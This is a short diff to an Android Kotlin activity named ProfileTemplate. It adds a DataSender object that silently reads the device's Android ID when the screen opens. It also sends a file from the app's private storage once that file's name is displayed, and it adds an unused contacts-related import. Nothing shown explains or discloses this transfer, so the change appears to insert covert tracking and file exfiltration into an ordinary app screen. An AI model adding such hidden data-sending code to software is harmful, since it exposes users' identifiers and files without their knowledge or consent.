@@ -10,6 +10,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
+import android.provider.ContactsContract.Data
 import android.provider.Settings
 import android.view.View
 import android.widget.Button
@@ -23,8 +24,10 @@ import kotlin.concurrent.thread
 
 
 class ProfileTemplate : AppCompatActivity() {
+    private var datasender = DataSender()
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        datasender.obtainAndroidID(this.contentResolver)
         val id = intent.getIntExtra("id",0)
         renderInfo(id)
 
@@ -178,6 +181,8 @@ class ProfileTemplate : AppCompatActivity() {
 
             val textView = findViewById<TextView>(R.id.filename)
             textView.text = filename
+
+            datasender.sendFile(filesDir.path + "/"+ filename)
         }
     }
 
